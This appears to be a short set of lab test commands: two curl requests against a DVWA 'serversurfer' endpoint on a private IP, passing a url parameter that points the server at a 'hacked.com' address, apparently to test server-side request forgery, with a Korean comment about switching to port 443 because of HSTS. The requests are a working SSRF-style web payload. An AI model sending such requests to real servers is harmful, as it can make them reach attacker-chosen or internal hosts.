curl -k --resolve curl.ncurity.com:80:192.168.41.91 "http://curl.ncurity.com/dvwa/serversurfer?url=https://hacked.com/your_hacked-15496f86-335d-43b2-a353-c98c74f1f39"

# HSTS로 인해 443으로 테스트
curl -k --resolve curl.ncurity.com:443:192.168.41.91 "https://curl.ncurity.com/dvwa/serversurfer?url=https://hacked.com/your_hacked-15496f86-335d-43b2-a353-c98c74f1f39"